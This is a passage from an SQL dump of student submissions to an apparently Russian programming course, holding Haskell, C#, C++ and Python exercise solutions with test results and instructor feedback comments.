(1226, 42, '16265158', '2012-09-30 18:57:03', 0, '\n\n\n\nmyfold _ counter [] = counter\n\nmyfold f b (h:list) =\n\n	myfold f (f b h) list\n\n	\n\n\n', 'Не удалось вычислить выражение "myfoldl (+) 0 [1,2,3]", проверьте правильность синтаксиса'),
(1227, 47, '2562137', '2012-09-30 18:57:45', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = [x:sub | sub <- fxs] ++ fxs where fxs = powerset xs', '<br/>Тесты успешно пройдены!'),
(1228, 42, '16265158', '2012-09-30 18:57:49', 1, '\r\n\r\n\r\nmyfoldl _ counter [] = counter\r\n\r\nmyfoldl f b (h:list) =\r\n\r\n	myfoldl f (f b h) list\r\n\r\n	\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1229, 48, '6774563', '2012-09-30 19:10:33', 1, 'module Main where\r\n\r\n-- это было первым решением, однако как только я собрался его отправить, появилась добавка про запрет пар\r\n\r\nmyreverse1 xs = foldr (x xs -> (second x):xs) [] (second (foldr makePairs (xs, []) xs))\r\n\r\nmakePairs y ((x:xs), ys)  = (xs, (y, x):ys)\r\n\r\nsecond (a, b) = b\r\n\r\n-- далее мне в голову не пришло ничего хорошего и я поступил нечестно. я нашел в интернете как превращать foldl в foldr, соответственно идея уже не моя.\r\n   --- Ну OK, искать в интернете - это тоже прекрасное умение) Но пожалуйста, не делитесь с другими \r\n   --- своими изысканиями, может кто-то сам придумает..\r\n\r\nmyreverse xs = foldr (y lambda ys -> lambda(y:ys)) id xs []\r\n   --- Или мне больше нравится та же идея в немного другой записи\r\n   ---    foldr (x func -> func . (x:)) id xs\r\n   --- Ставим задачу получаить не перевернутый список, \r\n   --- а _функцию_, которая сооружает перевернутый список, и это оказывается \r\n   --- гораздо проще (но эту идею вы тоже, пожалуйста, никому не рассказывайте)\r\n\r\n\r\nmain = putStrLn $ show(myreverse1 [1,2,3,4,5])', '<br/>Тесты успешно пройдены!'),
(1230, 36, '419046', '2012-09-30 19:17:05', 1, 'cubeTable n = zip ([1..n]) (map (^3) [1..n])\r\n', '<br/>Тесты успешно пройдены!'),
(1231, 35, '517309', '2012-09-30 19:36:45', 3, 'isosc a b c =\r\n\r\n	isoscin a b c || isoscin a c b || isoscin b a c || isoscin b c a || isoscin c a b || isoscin c b a\r\n\r\n	where\r\n\r\n		isoscin (x1,y1) (x2,y2) (x3,y3) =\r\n\r\n			-- they aren''t on one line and length of sides are the same\r\n\r\n			vmult left right /= 0 && len left == len right\r\n\r\n			where\r\n\r\n				left = (x2-x1, y2-y1)\r\n\r\n				right = (x3-x1, y3-y1)\r\n\r\n				vmult (xx1,yy1) (xx2,yy2) = xx1*yy2 - xx2*yy1\r\n\r\n				len (x,y) = x*x + y*y\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1232, 38, '16265158', '2012-09-30 19:58:18', 0, '\n\ndata Node = Node Int Node Node | Empty\n\n\n\nroot  (Node a _ _) = a\n\nleft  (Node _ a _) = a\n\nright (Node _ _ a) = a\n\n\n\n-- height :: Node -> Int\n\nheight Empty = 0\n\nheight node = 1+max (height (left node)) (height (right (node)))\n\n\n\n\n', 'Выражение имеет неправильное значение: height (Node 1 Empty Empty)'),
(1233, 38, '16265158', '2012-09-30 20:00:02', 1, '\r\ndata Node = Node Int Node Node | Empty\r\n\r\n\r\n\r\nroot  (Node a _ _) = a\r\n\r\nleft  (Node _ a _) = a\r\n\r\nright (Node _ _ a) = a\r\n\r\n\r\n\r\n-- height :: Node -> Int\r\n\r\nheight Empty = -1 \r\n\r\nheight node = 1+max (height (left node)) (height (right (node)))\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1234, 47, '6774563', '2012-09-30 20:01:14', 2, 'powerset xs = powersetImpl [] xs\r\n\r\npowersetImpl prefix [] = [prefix]\r\npowersetImpl prefix (x:xs) = (powersetImpl (x:prefix) xs) ++ (powersetImpl prefix xs)\r\n   --- У вас там в подсписках жлементы не в том порядке, что в исходном списке.. Это просто, конечно, но исправьте, пожалуста\r\n', 'Выражение имеет неправильное значение: elem [1,3] (powerset [1,2,3])'),
(1235, 43, '787463', '2012-09-30 20:07:17', 1, 'euclid a b\r\n  | a == 0 = (0, 1)\r\n  | otherwise =\r\n      let\r\n        (x1, y1) = euclid (mod b a) a\r\n      in (y1 - (div b a) * x1, x1)', '<br/>Тесты успешно пройдены!'),
(1236, 47, '787463', '2012-09-30 20:08:00', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = \r\n    let\r\n      ys = powerset xs\r\n      ts = map (qs -> (x:qs)) ys\r\n            --- или короче msp (x:) ys\r\n    in foldr (:) ts ys\r\n      --- или просто in ts ++ ys', '<br/>Тесты успешно пройдены!'),
(1237, 48, '787463', '2012-09-30 20:11:13', 2, 'myreverse xs = \r\n    let\r\n      (a:as) = foldr (	 ((y:ys):yss) -> (ys:(y:ys):yss)) [xs] xs\r\n    in map ((z:zs) -> z) as\r\n        --- Или мб короче map head as\r\n\r\n   --- ОК, замечательно, засчитано!\r\n   --- (Но если еще кто-то пришлет что-то похожее, то я пожалуй добавлю ограничение \r\n   --- "не использовать списки списков", я то просто все хочу подтолкнутть у немно другому решению)\r\n', '<br/>Тесты успешно пройдены!'),
(1238, 43, '6774563', '2012-09-30 20:12:39', 1, 'euclid 0 b = (0, 1)\r\neuclid a b = do\r\n	let (x1, y1) = euclid (b `mod` a) a -- никак не могу понять, закешируется ли это результат? можно ли обойтись без `do`?\r\n	((y1 - (b `div` a) * x1), x1)\r\n   --- Нет, не закешируется. В Хаскеле запомниются значения только для констант (те если вы напищете\r\n   --- x = f y, то значение x выпонится один раз и запомниться. \r\n   --- Про do вопрос не очень понятен? Вы имели в виду let наверное? Ну вилимо нет, в той или иной форме \r\n   --- не обойтись (можно вместо написать вспомогательную функцию, но это фактически то же самое)\r\n', '<br/>Тесты успешно пройдены!'),
(1239, 39, '16265158', '2012-09-30 20:13:51', 0, '\n\ndata Node = Node Int Node Node | Empty\n\n\n\nroot  (Node a _ _) = a\n\nleft  (Node _ a _) = a\n\nright (Node _ _ a) = a\n\n\n\n-- height :: Node -> Int\n\nminHeight node = \n\n	(hei 0 node) - 1\n\n	where\n\n		hei len Empty = len\n\n		hei len node = hei2 (len + 1) (right node) (hei (len + 1) (left node))\n\n		hei2 len Empty cmin = min len cmin\n\n		hei2 len node cmin \n\n			| len >= cmin = cmin\n\n			| otherwise = hei2 (len+1) (right node) (hei2 (len+1) (left node) cmin)\n\n\n\n-- minHeight (Node 1 (Node 2 (Node 3 Empty Empty) Empty) (Node 4 Empty Empty))\n\n\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(1240, 33, '5772638', '2012-09-30 20:15:21', 2, 'class Program\r\n    {\r\n        static void integral(Func<double, double> f, double a, double b)\r\n        {\r\n            double res = 0, h = (b - a) / 100, x0 = a;\r\n            while(x0<=b)\r\n            {\r\n                res= res+ f(x0 - h / 2);\r\n                x0 = x0 + h;\r\n            }\r\n            res = res * h;\r\n                --- В трех последних строчках лучще использовать +=\r\n            Console.WriteLine(res);\r\n    --- Вообще неплохо, но давайте я вас попрошу немного изменить:\r\n    ---  - сделать чтобы ваша функция возвращала не void а double (значение интеграла)\r\n    ---  - печатать ответ не внутри функции, а там, где вы ее вызываете, в main\r\n    --- Так более правильно, поому что ведь очень вероятно, что вы захотите с ответом сделать\r\n    --- что-то еще, а не только напечатать (ну например, возвести в квадрат, члодить с чем-то, \r\n    --- записать в файл и т.д.)\r\n    --- Если не очень понятно, то требуется, пишите.\r\n           \r\n       \r\n        }\r\n\r\n\r\n        static Func<double, double> sqr = i => i * i;\r\n\r\n        static  double cube (double i)\r\n        {\r\n            return i * i * i;\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            integral(sqr, 0, 2);// результат 2,5874\r\n            integral(cube, -1,1);// результат -0,04001\r\n            integral(i => i*i*i+2, 10,100);// результат 24109556,9175\r\n            Console.WriteLine("Press any key for exit");\r\n            Console.ReadKey();\r\n        }\r\n    }', '<br/>Тесты успешно пройдены!'),
(1241, 35, '51559263', '2012-09-30 20:33:49', 1, 'isosc (x1,y1) (x2,y2) (x3,y3) = let a = (x1 - x2)^2 + (y1 - y2)^2\r\n\r\n                                    b = (x1 - x3)^2 + (y1 - y3)^2\r\n\r\n			            c = (x3 - x2)^2 + (y3 - y2)^2\r\n\r\n                                in a == b || a == c || b == c\r\n', '<br/>Тесты успешно пройдены!'),
(1242, 39, '16265158', '2012-09-30 20:37:19', 0, '\n\ndata Node = Node Int Node Node | Empty\n\n\n\nroot  (Node a _ _) = a\n\nleft  (Node _ a _) = a\n\nright (Node _ _ a) = a\n\n\n\n-- height :: Node -> Int\n\nminHeight node = \n\n	(hei 0 node) - 1\n\n	where\n\n		hei len Empty = len \n\n		hei len node = hei2 (len + 1) (right node) (hei (len + 1) (left node))\n\n		hei2 len Empty cmin = min (len) cmin\n\n		hei2 len node cmin \n\n			| len > cmin = cmin\n\n			| otherwise = hei2 (len+1) (right node) (hei2 (len+1) (left node) cmin)\n\n\n\n-- minHeight (Node 1 (Node 2 (Node 3 Empty Empty) Empty) (Node 4 Empty Empty)) -- Answer: 1\n\n--                1*\n\n--               / \n\n--              2*  4*\n\n--             /   / \n\n--           3* nil nil nil\n\n\n\n-- minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty)) // ANSWER also should be -- 1! \n\n--                1*\n\n--               / \n\n--              2*  4*\n\n--             /   / \n\n--           nil 3* 5* nil\n\n\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(1243, 36, '51559263', '2012-09-30 20:50:26', 1, 'cubeTable n = zip [1..n] (map (^3) [1..n])\r\n', '<br/>Тесты успешно пройдены!'),
(1244, 34, 'Маргарита Нурмухаметова', '2012-09-30 21:07:27', 2, '// Integral.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <iostream>\r\n\r\nusing namespace std; \r\ntemplate <class Func>\r\nvoid FindIntegral(Func f, int a, int b)\r\n{\r\n	double n = 100; //шаг\r\n	double result = 0.0;\r\n	double sum = 0.0;\r\n	for (int i = 1; i <= n-1; i++){\r\n        sum = sum + f(a + i*((b-a)/n));\r\n            --- Тут лучше использовать +=\r\n	}\r\n	result = ((b-a)/n)*((f(a)+f(b))/2 + sum);\r\n	cout << result << "\r\n";\r\n    --- Вообще неплохо, но давайте я вас попрошу немного изменить:\r\n    ---  - сделать чтобы ваша функция возвращала не void а double (значение интеграла)\r\n    ---  - печатать ответ не внутри функции, а там, где вы ее вызываете, в main\r\n    --- Так более правильно, поому что ведь очень вероятно, что вы захотите с ответом сделать\r\n    --- что-то еще, а не только напечатать (ну например, возвести в квадрат, члодить с чем-то, \r\n    --- записать в файл и т.д.)\r\n    --- Если не очень понятно, то требуется, пишите.\r\n}\r\n\r\n\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	FindIntegral([] (double i) -> double\r\n			   { \r\n				   return i*i*i; \r\n			   }, \r\n			   0, 1);\r\n    system ("pause");\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1245, 39, '16265158', '2012-09-30 21:09:59', 1, '\r\ndata Node = Node Int Node Node | Empty\r\n\r\n\r\n\r\nroot  (Node a _ _) = a\r\n\r\nleft  (Node _ a _) = a\r\n\r\nright (Node _ _ a) = a\r\n\r\n\r\n\r\n-- isLeaf Empty = False\r\n\r\nisLeaf (Node _ Empty Empty) = True\r\n\r\nisLeaf (Node _ _ _) = False\r\n\r\n\r\n\r\n-- height :: Node -> Int\r\n\r\nminHeight node = \r\n\r\n	(hei 0 node maxint)\r\n\r\n	where\r\n\r\n		maxint = 10000\r\n\r\n		hei len Empty cmin = cmin\r\n\r\n		hei len node cmin \r\n\r\n			| len >= cmin = cmin\r\n\r\n			| isLeaf node = len\r\n\r\n			| otherwise = hei (len+1) (right node) (hei (len+1) (left node) cmin)\r\n\r\n\r\n\r\n-- minHeight (Node 1 (Node 2 (Node 3 Empty Empty) Empty) (Node 4 Empty Empty)) -- Answer: 1\r\n\r\n--                1*\r\n\r\n--               / \r\n\r\n--              2*  4*\r\n\r\n--             /   / \r\n\r\n--           3* nil nil nil\r\n\r\n\r\n\r\n-- minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))\r\n\r\n--                1*\r\n\r\n--               / \r\n\r\n--              2*  4*\r\n\r\n--             /   / \r\n\r\n--           nil 3* 5* nil\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1246, 48, '12206137', '2012-09-30 21:23:07', 1, 'myreverse x = foldr (x f -> (y -> f $ x:y)) id x []', '<br/>Тесты успешно пройдены!'),
(1247, 48, '2562137', '2012-09-30 21:46:59', 1, 'buildcomp list = (foldr (x f -> (xs -> f (x:xs))) id list)\r\nmyreverse list = (buildcomp list) []', '<br/>Тесты успешно пройдены!'),
(1248, 37, '51559263', '2012-09-30 22:04:28', 1, 'minsum xs = foldr min (1/0) ( map (x->fst x + snd x) (zip (init xs) (tail xs)) )\r\n\r\n            \r\n', '<br/>Тесты успешно пройдены!'),
(1249, 42, '51559263', '2012-09-30 22:24:34', 0, 'myfoldl f e [x] = f e x\r\n\nmyfoldl f e xs = f ( myfoldl f e (init xs) ) (last xs)\n', 'Не удалось вычислить выражение "myfoldl (+) 10 []", проверьте правильность синтаксиса'),
(1250, 42, '51559263', '2012-09-30 22:26:39', 1, 'myfoldl _ e [] = e\r\n\r\nmyfoldl f e [x] = f e x\r\n\r\nmyfoldl f e xs = f ( myfoldl f e (init xs) ) (last xs)\r\n   --- OK, это правильно, но, понятно, не очень эффективно, потому что init и last работают долго\r\n   --- Засчитано, а как еще можно сделать, мы обсудим в среду\r\n', '<br/>Тесты успешно пройдены!'),
(1251, 42, 'Boby', '2012-09-30 22:26:49', 1, 'myfoldl f e [] = e\r\n\r\nmyfoldl f e (x:xs) = myfoldl f (f e x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(1252, 37, '1384577', '2012-10-01 08:09:06', 1, 'minsum xs =minimum $ map ((x,y) -> x+y) $ tail $ zip (0:xs) xs', '<br/>Тесты успешно пройдены!'),
(1253, 47, '1384577', '2012-10-01 08:21:38', 1, 'powerset [] = [ [] ]\r\npowerset (x:xs) = powerset xs ++ (map (x:) (powerset xs))\r\n   --- ОК, но лучше powerset вызвать одн раз и запомнить ответ', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1254, 46, 'tonyo', '2012-10-01 08:37:03', 1, '#include <iostream>\r\n#include <vector>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nbool isOdd(int x)\r\n{\r\n    return x % 2 == 1;\r\n}\r\n\r\n\r\ntemplate <typename F>\r\nbool any(F f, const vector<int> &v)\r\n{\r\n    vector<int>::const_iterator it;\r\n    it = find_if(v.begin(), v.end(), f);\r\n      --- Можно сразу описать и нинциализировать.. vector<int>::const_iterator it = find_if(v.begin(), v.end(), f);\r\n      --- И видимо имеет смысл использовать auto, чтобы меньше писать auto it = find_if(v.begin(), v.end(), f);\r\n   \r\n    return it != v.end();\r\n}\r\n   --- Не имеет отношение к курсу, но вообще имеет смысл сделать тип контейнера тоже параметром шаблона\r\n   --- template <typename F, typename Cont>\r\n   --- bool any(F f, const Cont &v)\r\n   --- {\r\n   ---    Cont it = v.begin();\r\n   ---  Тогда функция будет работать не тодько с векторами чисел, а еще много с чем\r\n\r\nint main()\r\n{\r\n    vector<int> vect;\r\n\r\n    int ar[] = {4,2,6,8,10,5};\r\n    int n = sizeof(ar)/sizeof(int);\r\n\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        vect.push_back(ar[i]);\r\n    }\r\n\r\n    cout << any([](int x){return x % 2 == 1;}, vect) << "\r\n";\r\n    cout << any(isOdd, vect) << "\r\n";\r\n\r\n    return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1255, 45, 'tonyo', '2012-10-01 09:27:09', 1, '#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n\r\n# Пишем на Python\r\n\r\ndef any_f(f, l):\r\n    return any(f(x) for x in l)\r\n\r\ndef all_f(f, l):\r\n    return all(f(x) for x in l)\r\n\r\n\r\ndef check(list):\r\n    return  all_f(lambda sublist: any_f(lambda x: x%2==0,\r\n                                        sublist),\r\n                  list)\r\n\r\n# Можно немного короче:\r\ndef check2(list):\r\n    return all(any(x%2==0 for x in sublist) for sublist in list)\r\n\r\nl1 = [[1,2,3], [5], [7,8]]\r\nl2 = [[1,2,3], [5,6], [7,8]]\r\n\r\nprint(map(check, [l1, l2]))\r\nprint(map(check2, [l1, l2]))\r\n', '<br/>Тесты успешно пройдены!'),
(1256, 33, '4837959', '2012-10-01 09:38:35', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace PrintTable\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static double integral(Func<double, double> f, double a, double b)\r\n\r\n        {\r\n\r\n            const int COUNT = 100;\r\n\r\n\r\n\r\n            double step = (b - a) / COUNT;\r\n\r\n            double result = 0;\r\n\r\n            for (int i = 0; i < COUNT; ++i)\r\n\r\n            {\r\n\r\n                double x = a + i * step;\r\n\r\n                result += f(x) * step;\r\n\r\n            }\r\n\r\n	    return result;\r\n\r\n        }\r\n\r\n\r\n\r\n        static Func<double, double> sqr = i => i * i;\r\n\r\n\r\n\r\n        static double cube(double i)\r\n\r\n        {\r\n\r\n            return i * i * i;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            // Примеры вызова:\r\n\r\n            Console.WriteLine("{0}", integral(sql, 0, 10));\r\n\r\n            Console.WriteLine("{0}", integral(cube, -1, 1));\r\n\r\n\r\n\r\n            // И то же с лямбда выражениями\r\n\r\n            Console.WriteLine("{0}", integral(i => i * i, 0, 1));\r\n\r\n            Console.WriteLine("{0}", integral(i => i, 0, 3));\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1257, 34, '4837959', '2012-10-01 09:38:53', 1, '#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\ntemplate <class Func>\r\n\r\n// Интегрирование методом прямоугольников\r\n\r\ndouble integral(Func f, double a, double b)\r\n\r\n{\r\n\r\n    const int COUNT = 100;\r\n\r\n\r\n\r\n    double step = (b - a) / COUNT;\r\n\r\n    double result = 0;\r\n\r\n	for (int i = 0; i < COUNT; ++i)\r\n\r\n    {\r\n\r\n        double x = a + i * step;\r\n\r\n        result += f(x) * step;\r\n\r\n    }\r\n\r\n    return result;\r\n\r\n}\r\n\r\n\r\n\r\n// Примеры функций, которые можно передавать в printTable, как параметры\r\n\r\n\r\n\r\ndouble square(double i)\r\n\r\n{\r\n\r\n	return i * i;\r\n\r\n}\r\n\r\n\r\n\r\ndouble cube(double i)\r\n\r\n{\r\n\r\n	return i * i * i;\r\n\r\n}\r\n\r\n\r\n\r\nint main()\r\n\r\n{\r\n\r\n	// Примеры вызовов\r\n\r\n\r\n\r\n    double result = 0;\r\n\r\n	// Так можно передавать функции\r\n\r\n	result = integral(square, 0, 10);\r\n\r\n    cout << result << endl;\r\n\r\n\r\n\r\n	result = integral(cube, -1, 1);\r\n\r\n    cout << result << endl;\r\n\r\n\r\n\r\n	// Так можно передавать лямбда выражения\r\n\r\n	result = integral([] (double x) { return x * x; }, 0, 1);\r\n\r\n    cout << result << endl;\r\n\r\n\r\n\r\n	// Или то же самое, но мы заводим переменную и присваиваем ей лямбда выражени\r\n\r\n	auto line = [] (double i) { return i; };\r\n\r\n	result = integral(line, 0, 3);\r\n\r\n    cout << result << endl;\r\n\r\n\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1258, 33, '533223', '2012-10-01 11:09:11', 2, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace PrintTable\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        // Пример очень простой функции высщего порядка:\r\n\r\n        //   printTable(f, n) печатает знаяения функции f для чисел 1,2, ... n\r\n\r\n\r\n\r\n        static void integral(Func<double, double> f, int a, double b)\r\n\r\n        {\r\n\r\n            double res = 0;\r\n\r\n            for (int i = 0; i <= 100; i++)\r\n\r\n            {\r\n\r\n                res += f(a + i * (b - a) / 100) * (b - a) / 100;\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.WriteLine("{0}", res);\r\n    --- Вообще привильно, конечно, но давайте я вас попрошу немного изменить:\r\n    ---  - сделать чтобы ваша функция возвращала не void а double (значение интеграла)\r\n    ---  - печатать ответ не внутри функции, а там, где вы ее вызываете, в Main\r\n    --- Так более правильно, потому что ведь очень вероятно, что вы захотите с ответом сделать\r\n    --- что-то еще, а не только напечатать (ну например, возвести в квадрат и т.д.)\r\n        }\r\n\r\n\r\n\r\n        static Func<double, double> sqr = i => i * i;\r\n\r\n\r\n\r\n        static double cube(double i)\r\n\r\n        {\r\n\r\n            return i * i * i;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            // Примеры вызова:\r\n\r\n            integral(sqr, 0, 1);        // Печатаем квадраты\r\n\r\n            integral(cube, 0, 1);       // Печатаем кубы\r\n\r\n\r\n\r\n            // И то же с лямбда выражениями\r\n\r\n            integral(i => i * i, 0, 1);\r\n\r\n            integral(i => i * i * i, 0, 1);\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1259, 34, '533223', '2012-10-01 12:16:49', 0, '}\r\n\r\n// Примеры функций, которые можно передавать в printTable, как параметры\r\n\r\ndouble square(double i)\r\n{\r\n	return i*i;\r\n}\r\n\r\ndouble cube(double i)\r\n{\r\n	return i*i*i;\r\n}\r\n\r\nint main()\r\n{\r\n	// Примеры вызовов\r\n\r\n	// Так можно передавать функции\r\n	integral(square, 0, 1);\r\n	integral(cube, 0, 1);\r\n\r\n	// Так можно передавать лямбда выражения\r\n	integral([] (double i) -> double\r\n			   { \r\n				   return i*i; \r\n			   }, \r\n			   0 , 1);\r\n\r\n	// Или, в данном случае, -> тип можно не писать\r\n	integral([] (double i) { return i*i; }, \r\n			   0, 1);\r\n\r\n	// Или то же самое, но мы заводим переменную и присваиваем ей лямбда выражени\r\n	auto sqr = [] (double i) { return i*i; };\r\n	integral(sqr, 0 , 1);\r\n\r\n	int n;\r\n	cin >> n;\r\n}', '<br/>Тесты успешно пройдены!'),
(1260, 33, '4169333', '2012-10-01 12:17:08', 1, 'namespace _1_01_10\r\n{\r\n    class Program\r\n    {\r\n\r\n        static double integral (Func<double, double> f, int a,int b)\r\n        {\r\n            double n= 100;\r\n            double p = (b - a) / n;\r\n            double s = 0;\r\n            double p1 = a;\r\n            for (int i = 0; i <= n-1; i++)\r\n            {\r\n                s = s + (f(p1) + f(p1 + p)) * (p) / 2;\r\n                p1 = p1 + p;\r\n                  --- Тут оба раза лучше, конечно, использовать +=\r\n            }\r\n            return s;\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            double res =integral(x => x*x, 2,3);\r\n            Console.WriteLine("Result: " + res);\r\n            Console.ReadLine();\r\n            /* Результаты работы: а) sin x, интервал от 1 до 2: 0,9564411           \r\n                                  б) x^3, интервал от 0 до 1: 0,250025\r\n                                  в) x^2, интервал от 2 до 3: 6,333349\r\n            */                      \r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1261, 34, '4169333', '2012-10-01 12:17:30', 1, '#include "stdafx.h"\r\n#include <iostream>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\ntemplate <class Func>\r\ndouble integral(Func f,int a,int b)\r\n{\r\n	 double n= 100;\r\n     double p = (b - a) / n;\r\n     double s = 0;\r\n     double p1 = a;\r\n     for (int i = 0; i <= n-1; i++)\r\n     {\r\n         s = s + (f(p1) + f(p1 + p)) * (p) / 2;\r\n         p1 = p1 + p;\r\n       --- И тут тоже лучше использовать +=\r\n     }\r\n     return s;\r\n\r\n}\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	double result = integral([](double x) { return x*x*x; }, 1, 2);\r\n	cout << "Result: " << result;\r\n	getch();\r\n	return 0;\r\n	/* Результаты работы: а) sin x, интервал от 1 до 2: 0,956441           \r\n                          б) x^3, интервал от 0 до 1: 0,250025\r\n                          в) x^2, интервал от 1 до 2: 0,33335\r\n\r\n	*/\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1262, 45, '787463', '2012-10-01 12:22:36', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace task_8_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		static bool CheckParity(int[][] array)\r\n\r\n		{\r\n\r\n			return array.All(xs => xs.Any(x => x % 2 == 0));\r\n\r\n		}\r\n\r\n		\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			int[][] array1 = { new int[] {1, 3, 5}, new int[] {5, 7, 8, 9, 11} };\r\n\r\n			int[][] array2 = { new int[] {1, 3, 4}, new int[] {5, 6, 7}, new int[] {1, 3, 5, 6, 7, 7} };\r\n\r\n			\r\n\r\n			Console.WriteLine("{0}", CheckParity(array1));\r\n\r\n			Console.WriteLine("{0}", CheckParity(array2));\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1263, 46, '787463', '2012-10-01 12:23:05', 1, '#include <iostream>\r\n\r\n#include <algorithm>\r\n\r\n#include <vector>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nbool checkParity(int array[], size_t arrayLength) {\r\n    --- К теме курса совсем не относиться, но немного лучше, видимо, const int arra[] \r\n    --- (и дальше еще добавить несколько const) \r\n	int *arrayEnd = array + arrayLength;\r\n\r\n	int *iterator = find_if(array, arrayEnd, [](int x){ return x % 2 == 0; });\r\n\r\n	return iterator != arrayEnd;\r\n\r\n}\r\n\r\n\r\n\r\nbool isEven(int x) {\r\n\r\n	return x % 2 == 0;\r\n\r\n}\r\n\r\n\r\n\r\nbool checkParity(vector<int> v) {\r\n\r\n	vector<int>::iterator i;\r\n\r\n	i = find_if (v.begin(), v.end(), isEven);\r\n\r\n	return i != v.end();\r\n\r\n}\r\n\r\n\r\n\r\nint main () {\r\n\r\n	int array1[] = {3, 5, 7, 9, 11};\r\n\r\n	int array2[] = {3, 5, 8, 9, 11};\r\n\r\n	int array1Length = sizeof array1 / sizeof array1[0];\r\n\r\n	int array2Length = sizeof array2 / sizeof array2[0];\r\n\r\n	\r\n\r\n	cout << checkParity(array1, array1Length) << endl;\r\n\r\n	cout << checkParity(array2, array2Length) << endl;\r\n\r\n	\r\n\r\n	vector<int> vector1(array1, array1 + array1Length);\r\n\r\n	vector<int> vector2(array2, array2 + array2Length);\r\n\r\n	\r\n\r\n	cout << checkParity(vector1) << endl;\r\n\r\n	cout << checkParity(vector2) << endl;\r\n\r\n	\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1264, 33, '533223', '2012-10-01 12:26:18', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace PrintTable\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static double integral(Func<double, double> f, double a, double b)\r\n\r\n        {\r\n\r\n            double res= 0;\r\n\r\n            for (int i = 0; i <= 100; i++)\r\n\r\n            {\r\n\r\n                res += f(a + (b - a) / 100 * i) * (b - a) / 100;\r\n\r\n            }\r\n\r\n            return res;\r\n\r\n        }\r\n\r\n\r\n\r\n        static Func<double, double> sqr = i => i * i;\r\n\r\n\r\n\r\n        static double cube(double i)\r\n\r\n        {\r\n\r\n            return i * i * i;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            \r\n\r\n            // Примеры вызова:\r\n\r\n\r\n\r\n            Console.WriteLine("{0} {1}", "Интеграл квадрата функции на промежутке [0,1] ", integral(sqr, 0 , 1));\r\n\r\n            Console.WriteLine("{0} {1}", "Интеграл куба функции на промежутке [0,1] ", integral(cube, 0, 1));\r\n\r\n            // И то же с лямбда выражениями\r\n\r\n            Console.WriteLine("{0} {1}", "Интеграл квадрата функции на промежутке [0,1] ", integral(i => i * i, 0, 1));\r\n\r\n            Console.WriteLine("{0} {1}", "Интеграл куба функции на промежутке [0,1] ", integral(i => i * i * i, 0, 1));\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
